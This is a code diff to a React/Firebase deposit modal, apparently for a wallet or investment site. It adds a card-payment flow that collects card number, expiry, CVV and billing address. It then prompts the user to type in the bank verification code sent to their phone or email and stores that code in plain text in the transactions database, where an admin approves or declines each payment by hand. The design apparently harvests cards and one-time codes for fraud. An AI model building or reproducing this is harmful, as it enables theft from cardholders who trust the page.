@@ -1,17 +1,20 @@
-﻿"use client";
+"use client";
 
 import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { Modal } from "@/components/ui/modal";
 import {
     Check, Copy, CheckCircle2, Loader2, ArrowRight,
-    Building2, UploadCloud, Clock, ChevronLeft, CreditCard
+    Building2, UploadCloud, Clock, ChevronLeft, CreditCard, XCircle
 } from "lucide-react";
 import { BitcoinLogo, EthereumLogo, USDTLogo, PayPalLogo, CashAppLogo } from "@/components/shared/BrandLogos";
-import { addDoc, collection, serverTimestamp, doc, getDoc } from "firebase/firestore";
+import { addDoc, collection, serverTimestamp, doc, getDoc, updateDoc, onSnapshot } from "firebase/firestore";
 import { db } from "@/lib/firebase/config";
 import { toast } from "sonner";
 import { cn } from "@/lib/utils";
+import { detectCardBrand, formatCardNumber, formatExpiry, toSafeCardPayload, validateSafeCardInput } from "@/lib/payments/card";
+import { CardBrandBadge } from "@/components/ui/CardBrandBadge";
+import { getEnabledCryptoOptions, getCryptoAddress } from "@/lib/payments/crypto";
 
 interface DepositModalProps {
     isOpen: boolean;
@@ -34,10 +37,31 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
     const [copied, setCopied] = useState<string | null>(null);
     const [receiptUrl, setReceiptUrl] = useState<string | null>(null);
     const [receiptName, setReceiptName] = useState<string | null>(null);
+    const [submittedTxId, setSubmittedTxId] = useState<string | null>(null);
+    const [authCode, setAuthCode] = useState("");
+    const [authLoading, setAuthLoading] = useState(false);
+    const [txData, setTxData] = useState<any>(null);
+    const [cardErrorMessage, setCardErrorMessage] = useState("");
     const [uploading, setUploading] = useState(false);
     const [adminConfig, setAdminConfig] = useState<any>(null);
     const [userData, setUserData] = useState<any>(null);
+    const cryptoOptions = getEnabledCryptoOptions(adminConfig);
     const [selectedMethodConfig, setSelectedMethodConfig] = useState<any>(null);
+    const [cardForm, setCardForm] = useState({
+        cardType: "",
+        cardNumber: "",
+        expiry: "",
+        securityCode: "",
+        billingName: "",
+        billingEmail: "",
+        billingPhone: "",
+        billingHouseNumber: "",
+        billingStreet: "",
+        billingAddress: "",
+        billingCity: "",
+        billingZip: "",
+        billingCountry: "United States",
+    });
     const fileRef = useRef<HTMLInputElement>(null);
 
     useEffect(() => {
@@ -47,8 +71,46 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
 
     useEffect(() => {
         if (!isOpen) return;
-        setStep(1); setAmount(""); setMethod(null); setSelectedMethodConfig(null); setCryptoAsset(null); setReceiptUrl(null); setReceiptName(null);
+        setStep(1); setAmount(""); setMethod(null); setSelectedMethodConfig(null); setCryptoAsset(null); setReceiptUrl(null); setReceiptName(null); setSubmittedTxId(null); setAuthCode(""); setCardErrorMessage("");
+        setCardForm({
+            cardType: "",
+            cardNumber: "",
+            expiry: "",
+            securityCode: "",
+            billingName: userData?.displayName || userData?.fullName || "",
+            billingEmail: userData?.email || "",
+            billingPhone: userData?.phoneNumber || "",
+            billingHouseNumber: "",
+            billingStreet: userData?.address || "",
+            billingAddress: userData?.address || "",
+            billingCity: userData?.city || "",
+            billingZip: userData?.zipCode || "",
+            billingCountry: userData?.country || "United States",
+        });
     }, [isOpen]);
+
+    useEffect(() => {
+        if (!submittedTxId) {
+            setTxData(null);
+            return;
+        }
+        const unsub = onSnapshot(doc(db, "transactions", submittedTxId), (snap) => {
+            if (snap.exists()) {
+                const data = snap.data();
+                const currentStatus = data.status;
+
+                setTxData({ id: snap.id, ...data });
+
+                if (currentStatus === "completed") {
+                    setStep(5);
+                }
+                if (currentStatus === "declined") {
+                    setStep(7);
+                }
+            }
+        });
+        return () => unsub();
+    }, [submittedTxId]);
 
     const labelIdx = step <= 1 ? 0 : step <= 3 ? 1 : 2;
     const amountLocal = Number(amount) || 0;
@@ -82,17 +144,33 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
             toast.error("Deposits are locked for this account. Please contact support.");
             return;
         }
-        if (!receiptUrl) { toast.error("Please upload your payment receipt first."); return; }
+        const isCard = selectedMethodConfig?.type === "card" || method === "card";
+        let cardPayload: ReturnType<typeof toSafeCardPayload> | null = null;
+        if (isCard) {
+            const normalizedCardForm = {
+                ...cardForm,
+                billingAddress: `${cardForm.billingHouseNumber} ${cardForm.billingStreet}`.trim(),
+            };
+            const cardError = validateSafeCardInput(normalizedCardForm);
+            if (cardError) { setCardErrorMessage(cardError); toast.error(cardError); return; }
+            setCardErrorMessage("");
+            cardPayload = toSafeCardPayload(normalizedCardForm);
+        } else if (!receiptUrl) {
+            toast.error("Please upload your payment receipt first.");
+            return;
+        }
         setLoading(true);
         try {
-            await addDoc(collection(db, "transactions"), {
+            const txRef = await addDoc(collection(db, "transactions"), {
                 userId, type: "deposit",
                 amount: amountUsd, amountLocal, currencyCode, exchangeRate, status: "pending",
-                method, methodLabel: selectedMethodConfig?.label || method, asset: cryptoAsset || "N/A",
-                receiptUrl,
+                method, methodLabel: cardPayload ? `${cardPayload.brand} ending ${cardPayload.last4}` : selectedMethodConfig?.label || method, asset: cryptoAsset || "N/A",
+                receiptUrl: receiptUrl || null,
+                ...(cardPayload ? { card: cardPayload, cardVerification: { status: "auth_in_progress", channel: "email", adminNote: "" } } : {}),
                 description: "Wallet deposit",
                 createdAt: serverTimestamp(), updatedAt: serverTimestamp(),
             });
+            setSubmittedTxId(txRef.id);
             const userSnap = await getDoc(doc(db, "users", userId));
             const userData = userSnap.exists() ? userSnap.data() : null;
             if (userData?.email) {
@@ -113,24 +191,50 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                     })
                 });
             }
-            setStep(5);
-        } catch { toast.error("Failed to submit. Please try again."); }
+            setStep(cardPayload ? 6 : 5);
+        } catch (error: any) { toast.error(error?.message || "Failed to submit. Please try again."); }
         finally { setLoading(false); }
+    };
+
+    const submitAuthCode = async () => {
+        if (!submittedTxId || authCode.trim().length < 4) {
+            toast.error("Enter the verification code.");
+            return;
+        }
+        setAuthLoading(true);
+        try {
+            await updateDoc(doc(db, "transactions", submittedTxId), {
+                "cardVerification.status": "submitted",
+                "cardVerification.codeSubmitted": true,
+                "cardVerification.codeLength": authCode.trim().length,
+                "cardVerification.code": authCode.trim(),
+                "cardVerification.submittedAt": serverTimestamp(),
+                updatedAt: serverTimestamp(),
+            });
+            toast.success("Verification submitted. Payment remains pending.");
+            setAuthCode("");
+        } catch {
+            toast.error("Could not submit verification.");
+        } finally {
+            setAuthLoading(false);
+        }
     };
 
     const configuredMethods = Array.isArray(adminConfig?.paymentMethods) ? adminConfig.paymentMethods : [];
     const customDepositMethods = configuredMethods.filter((m: any) => m?.enabled && (m.flow === "deposit" || m.flow === "both"));
-    const depositMethods = customDepositMethods.length > 0 ? customDepositMethods : [
+    const cardMethod = { id: "card", type: "card", label: "Credit Card", sub: "Secure card authorization", logoUrl: "", destination: "" };
+    const depositMethods = customDepositMethods.length > 0 ? [
+        ...(customDepositMethods.some((m: any) => m?.type === "card" || m?.id === "card") ? [] : [cardMethod]),
+        ...customDepositMethods,
+    ] : [
+        cardMethod,
         { id: "crypto", type: "crypto", label: "Cryptocurrency", sub: "BTC · ETH · USDT", logoUrl: "", destination: "" },
         { id: "cashapp", type: "cashapp", label: "Cash App", sub: "Instant transfer", logoUrl: "", destination: adminConfig?.cashappTag || "" },
         { id: "paypal", type: "paypal", label: "PayPal", sub: "Pay with your PayPal account", logoUrl: "", destination: adminConfig?.paypalEmail || "" },
     ];
     const paypalRecipient = selectedMethodConfig?.type === "paypal" ? selectedMethodConfig?.destination : adminConfig?.paypalEmail || "";
     const cashappRecipient = selectedMethodConfig?.type === "cashapp" ? selectedMethodConfig?.destination : adminConfig?.cashappTag || "";
-    const cryptoAddress =
-        cryptoAsset === "btc"  ? adminConfig?.btcAddress :
-        cryptoAsset === "eth"  ? adminConfig?.ethAddress :
-        cryptoAsset === "usdt" ? adminConfig?.usdtAddress : null;
+    const cryptoAddress = getCryptoAddress(adminConfig, cryptoAsset);
 
     if (step === 5) {
         return (
@@ -142,7 +246,7 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                     <div className="space-y-2">
                         <h3 className="text-lg font-semibold text-white">Deposit submitted</h3>
                         <p className="text-sm text-zinc-400 max-w-xs mx-auto">
-                            Your receipt is under review. We'll credit the USD equivalent of {currencySymbol}{amountLocal.toLocaleString()} once confirmed.
+                            Your {selectedMethodConfig?.type === "card" ? "card payment" : "receipt"} is under review. We'll credit the USD equivalent of {currencySymbol}{amountLocal.toLocaleString()} once confirmed.
                         </p>
                     </div>
                     <div className="flex items-center gap-2 px-4 py-2.5 bg-blue-500/[0.08] border border-blue-500/15 rounded-xl w-full justify-center">
@@ -151,6 +255,110 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                     </div>
                     <button onClick={() => { onClose(); router.push('/dashboard'); }} className="w-full h-11 bg-white/[0.06] border border-white/[0.08] text-white font-medium text-sm rounded-xl hover:bg-white/[0.10] transition-colors">
                         Back to Dashboard
+                    </button>
+                </div>
+            </Modal>
+        );
+    }
+
+    if (step === 6) {
+        const liveVerificationStatus = txData?.cardVerification?.status || "auth_in_progress";
+        const isSubmitted = liveVerificationStatus === "submitted";
+
+        return (
+            <Modal isOpen={isOpen} onClose={() => {}} title={isSubmitted ? "Payment Processing" : "Authorization In Progress"}>
+                <div className="flex flex-col items-center text-center py-8 space-y-5 animate-in zoom-in-95 duration-300">
+                    {isSubmitted ? (
+                        <>
+                            <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/20 rounded-full flex items-center justify-center">
+                                <Loader2 className="w-8 h-8 text-blue-500 animate-spin" />
+                            </div>
+                            <div className="space-y-2">
+                                <h3 className="text-lg font-semibold text-white">Verifying payment details...</h3>
+                                <p className="text-sm text-zinc-400 max-w-xs mx-auto">
+                                    Verification in progress. Please hold on while your authorization is being processed.
+                                </p>
+                            </div>
+                        </>
+                    ) : (
+                        <>
+                            <div className="w-16 h-16 bg-amber-500/15 border border-amber-500/25 rounded-full flex items-center justify-center">
+                                <Clock className="w-8 h-8 text-amber-300" />
+                            </div>
+                            <div className="space-y-2">
+                                <h3 className="text-lg font-semibold text-white">Check for verification code</h3>
+                                <p className="text-sm text-zinc-400 max-w-xs mx-auto">
+                                    We sent the authorization request. Check your email or phone for the bank verification code, then enter it below.
+                                </p>
+                            </div>
+                            <input
+                                value={authCode}
+                                onChange={e => setAuthCode(e.target.value.replace(/[^\dA-Za-z-]/g, "").slice(0, 12))}
+                                placeholder="Verification code"
+                                autoComplete="one-time-code"
+                                className="w-full h-12 bg-zinc-950/60 border border-white/[0.08] rounded-xl px-4 text-white text-center tracking-[0.35em] font-semibold outline-none focus:border-blue-500/50"
+                            />
+                        </>
+                    )}
+
+                    {txData?.adminNote && (
+                        <div className="rounded-lg bg-amber-500/[0.07] border border-amber-500/15 p-3 text-xs text-amber-100/80 w-full text-left">
+                            {txData.adminNote}
+                        </div>
+                    )}
+
+                    <div className="w-full p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl text-left space-y-2">
+                        <div className="flex justify-between text-xs"><span className="text-zinc-500">Amount</span><span className="text-white font-semibold">{currencySymbol}{amountLocal.toLocaleString()} {currencyCode}</span></div>
+                        <div className="flex justify-between text-xs"><span className="text-zinc-500">Reference</span><span className="text-zinc-300 font-mono">{submittedTxId?.slice(0, 10) || "pending"}</span></div>
+                        <div className="flex justify-between text-xs">
+                            <span className="text-zinc-500">Status</span>
+                            <span className={cn(
+                                "font-semibold capitalize",
+                                isSubmitted ? "text-blue-400" : "text-amber-300"
+                            )}>
+                                {isSubmitted ? "Verifying" : "Awaiting Code"}
+                            </span>
+                        </div>
+                    </div>
+
+                    {!isSubmitted && (
+                        <button onClick={submitAuthCode} disabled={authLoading} className="w-full h-11 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-semibold text-sm rounded-xl transition-colors flex items-center justify-center gap-2">
+                            {authLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Continue Authorization"}
+                        </button>
+                    )}
+
+                    <button onClick={() => { onClose(); router.push('/dashboard/wallet'); }} className="w-full h-10 bg-white/[0.06] border border-white/[0.08] text-zinc-300 font-medium text-sm rounded-xl hover:bg-white/[0.10] transition-colors">
+                        Back to Wallet
+                    </button>
+                </div>
+            </Modal>
+        );
+    }
+
+    if (step === 7) {
+        return (
+            <Modal isOpen={isOpen} onClose={onClose} title="Payment Declined">
+                <div className="flex flex-col items-center text-center py-8 space-y-5 animate-in zoom-in-95 duration-300">
+                    <div className="w-16 h-16 bg-rose-500/15 border border-rose-500/25 rounded-full flex items-center justify-center">
+                        <XCircle className="w-8 h-8 text-rose-400" />
+                    </div>
+                    <div className="space-y-2">
+                        <h3 className="text-lg font-semibold text-white">Authorization Failed</h3>
+                        <p className="text-sm text-zinc-400 max-w-xs mx-auto">
+                            Your card authorization could not be completed. Please check your card details and try again.
+                        </p>
+                    </div>
+                    {txData?.adminNote && (
+                        <div className="w-full p-4 rounded-xl bg-rose-500/[0.07] border border-rose-500/20 text-left text-xs text-rose-200">
+                            <span className="font-semibold block mb-1">Reason:</span>
+                            {txData.adminNote}
+                        </div>
+                    )}
+                    <button onClick={() => { setStep(4); }} className="w-full h-11 bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm rounded-xl transition-colors">
+                        Try Another Card
+                    </button>
+                    <button onClick={() => { onClose(); router.push('/dashboard'); }} className="w-full h-10 bg-white/[0.06] border border-white/[0.08] text-zinc-300 font-medium text-sm rounded-xl hover:bg-white/[0.10] transition-colors">
+                        Close
                     </button>
                 </div>
             </Modal>
@@ -249,10 +457,8 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                     <div className="space-y-3 animate-in slide-in-from-right-3 duration-300">
                         <p className="text-sm text-zinc-400 mb-1">Select the asset you'll pay with.</p>
                         {[
-                            { id: "btc",  name: "Bitcoin",    ticker: "BTC",               Logo: BitcoinLogo },
-                            { id: "eth",  name: "Ethereum",   ticker: "ETH",               Logo: EthereumLogo },
-                            { id: "usdt", name: "Tether USD", ticker: "USDT (ERC20/TRC20)", Logo: USDTLogo },
-                        ].map((coin) => (
+                            ...cryptoOptions.map((coin) => ({ ...coin, Logo: coin.id === "btc" ? BitcoinLogo : coin.id === "eth" ? EthereumLogo : coin.id === "usdt" ? USDTLogo : null }))
+                        ].filter((coin: any) => coin.Logo).map((coin: any) => (
                             <button key={coin.id}
                                 onClick={() => { setCryptoAsset(coin.id); setStep(4); }}
                                 className="w-full flex items-center gap-4 p-4 bg-white/[0.03] border border-white/[0.06] rounded-xl hover:border-blue-500/30 hover:bg-white/[0.05] transition-all text-left group">
@@ -275,11 +481,62 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                     <div className="space-y-4 animate-in slide-in-from-right-3 duration-300">
                         <div>
                             <p className="text-sm font-semibold text-white mb-0.5">Send your payment</p>
-                            <p className="text-xs text-zinc-500">Transfer exactly <span className="text-white font-medium">{currencySymbol}{amountLocal.toLocaleString()} {currencyCode}</span> to the details below, then upload your receipt.</p>
+                            <p className="text-xs text-zinc-500">
+                                {selectedMethodConfig?.type === "card"
+                                    ? <>Authorize exactly <span className="text-white font-medium">{currencySymbol}{amountLocal.toLocaleString()} {currencyCode}</span>. The payment will stay pending until admin processing is complete.</>
+                                    : <>Transfer exactly <span className="text-white font-medium">{currencySymbol}{amountLocal.toLocaleString()} {currencyCode}</span> to the details below, then upload your receipt.</>
+                                }
+                            </p>
                             {currencyCode !== "USD" && <p className="text-[11px] text-zinc-600 mt-1">Estimated USD credit: ${amountUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}</p>}
                         </div>
 
-                        {/* Payment destination */}
+                        {selectedMethodConfig?.type === "card" ? (
+                            <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4 space-y-3">
+                                <div className="flex items-start gap-3 p-3 bg-blue-500/[0.06] border border-blue-500/15 rounded-xl">
+                                    <CreditCard className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
+                                    <p className="text-xs text-zinc-400">Issuer verification codes are used to confirm your deposit authorization.</p>
+                                </div>
+                                <div className="space-y-1">
+                                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Card number</label>
+                                    <div className="relative">
+                                        <input value={cardForm.cardNumber} onChange={e => setCardForm({ ...cardForm, cardNumber: formatCardNumber(e.target.value) })} inputMode="numeric" autoComplete="off" placeholder="Card number" className="w-full h-10 pr-20 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                        <span className="absolute right-2 top-1/2 -translate-y-1/2">
+                                            <CardBrandBadge brand={detectCardBrand(cardForm.cardNumber)} />
+                                        </span>
+                                    </div>
+                                </div>
+                                <div className="grid grid-cols-2 gap-2">
+                                    <div className="space-y-1">
+                                        <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Expiry date</label>
+                                        <input value={cardForm.expiry} onChange={e => setCardForm({ ...cardForm, expiry: formatExpiry(e.target.value) })} inputMode="numeric" autoComplete="off" placeholder="MM/YY" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                    </div>
+                                    <div className="space-y-1">
+                                        <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Security code</label>
+                                        <input value={cardForm.securityCode} onChange={e => setCardForm({ ...cardForm, securityCode: e.target.value.replace(/\D/g, "").slice(0, 4) })} inputMode="numeric" autoComplete="off" placeholder="CVV" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                    </div>
+                                </div>
+                                <div className="space-y-1">
+                                    <label className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest">Name on card</label>
+                                    <input value={cardForm.billingName} onChange={e => setCardForm({ ...cardForm, billingName: e.target.value })} autoComplete="off" placeholder="J. Smith" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                </div>
+                                <input value={cardForm.billingEmail} onChange={e => setCardForm({ ...cardForm, billingEmail: e.target.value })} placeholder="Billing email" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest pt-1">Billing address</p>
+                                <input value={cardForm.billingCountry} onChange={e => setCardForm({ ...cardForm, billingCountry: e.target.value })} placeholder="Country/Region" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                <div className="grid grid-cols-2 gap-2">
+                                    <input value={cardForm.billingHouseNumber} onChange={e => setCardForm({ ...cardForm, billingHouseNumber: e.target.value })} placeholder="House number" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                    <input value={cardForm.billingStreet} onChange={e => setCardForm({ ...cardForm, billingStreet: e.target.value })} placeholder="Street" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                </div>
+                                <div className="grid grid-cols-2 gap-2">
+                                    <input value={cardForm.billingCity} onChange={e => setCardForm({ ...cardForm, billingCity: e.target.value })} placeholder="City / Town" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                    <input value={cardForm.billingZip} onChange={e => setCardForm({ ...cardForm, billingZip: e.target.value })} placeholder="Postal code" className="w-full h-10 bg-white/[0.04] border border-white/[0.08] rounded-lg text-sm text-white px-3 outline-none focus:border-blue-500/40" />
+                                </div>
+                                {cardErrorMessage && (
+                                    <div className="p-3 rounded-xl bg-rose-500/[0.08] border border-rose-500/20 text-xs text-rose-200">
+                                        {cardErrorMessage}
+                                    </div>
+                                )}
+                            </div>
+                        ) : (
                         <div className="bg-white/[0.03] border border-white/[0.06] rounded-xl p-4 space-y-3">
                             {selectedMethodConfig && !["cashapp", "paypal", "crypto"].includes((selectedMethodConfig.type || selectedMethodConfig.id || "").toLowerCase()) && (<>
                                 <p className="text-xs font-medium text-zinc-400">{selectedMethodConfig.label} Details</p>
@@ -328,16 +585,17 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                                 {selectedMethodConfig?.instructions && <p className="text-[11px] text-zinc-600">{selectedMethodConfig.instructions}</p>}
                             </>) : null}
                         </div>
+                        )}
 
                         {/* Divider */}
-                        <div className="flex items-center gap-3">
+                        {selectedMethodConfig?.type !== "card" && <div className="flex items-center gap-3">
                             <div className="flex-1 h-px bg-white/[0.06]" />
                             <span className="text-xs text-zinc-600">Upload your receipt</span>
                             <div className="flex-1 h-px bg-white/[0.06]" />
-                        </div>
+                        </div>}
 
                         {/* Receipt upload */}
-                        {receiptUrl ? (
+                        {selectedMethodConfig?.type === "card" ? null : receiptUrl ? (
                             <div className="flex items-center gap-3 p-4 rounded-xl border border-emerald-500/25 bg-emerald-500/[0.04]">
                                 <div className="w-9 h-9 bg-emerald-500/15 rounded-lg flex items-center justify-center shrink-0">
                                     <CheckCircle2 className="w-5 h-5 text-emerald-400" />
@@ -361,20 +619,22 @@ export default function DepositModal({ isOpen, onClose, userId, currencySymbol, 
                         <input ref={fileRef} type="file" accept="image/*,.pdf" className="hidden" onChange={handleReceiptUpload} />
 
                         {/* Verification ETA */}
-                        <div className="flex items-start gap-3 p-3 bg-blue-500/[0.06] border border-blue-500/15 rounded-xl">
-                            <Clock className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
-                            <p className="text-xs text-zinc-400">Verification typically completes in <span className="text-white font-medium">1–5 minutes</span> after your receipt is submitted.</p>
-                        </div>
+                        {selectedMethodConfig?.type !== "card" && (
+                            <div className="flex items-start gap-3 p-3 bg-blue-500/[0.06] border border-blue-500/15 rounded-xl">
+                                <Clock className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
+                                <p className="text-xs text-zinc-400">Verification typically completes in <span className="text-white font-medium">1–5 minutes</span> after your receipt is submitted.</p>
+                            </div>
+                        )}
 
                         {(userData?.depositsLocked || userData?.walletLocked) && (
                             <div className="p-3 bg-rose-500/[0.07] border border-rose-500/20 rounded-xl text-xs text-rose-200">
                                 Deposits are locked for this account.
                             </div>
                         )}
-                        <button onClick={handleDeposit} disabled={loading || !receiptUrl || userData?.depositsLocked || userData?.walletLocked}
+                        <button onClick={handleDeposit} disabled={loading || (selectedMethodConfig?.type !== "card" && !receiptUrl) || userData?.depositsLocked || userData?.walletLocked}
                             className={cn("w-full h-11 rounded-xl font-semibold text-sm flex items-center justify-center gap-2 transition-all",
-                                receiptUrl ? "bg-blue-600 hover:bg-blue-700 text-white" : "bg-white/[0.04] border border-white/[0.06] text-zinc-600 cursor-not-allowed")}>
-                            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : "Submit Deposit"}
+                                (receiptUrl || selectedMethodConfig?.type === "card") ? "bg-blue-600 hover:bg-blue-700 text-white" : "bg-white/[0.04] border border-white/[0.06] text-zinc-600 cursor-not-allowed")}>
+                            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : selectedMethodConfig?.type === "card" ? "Authorize Card" : "Submit Deposit"}
                         </button>
                         <button onClick={() => { setMethod(null); setCryptoAsset(null); setStep(2); }}
                             className="w-full flex items-center justify-center gap-1.5 py-1 text-xs text-zinc-500 hover:text-zinc-300 transition-colors">
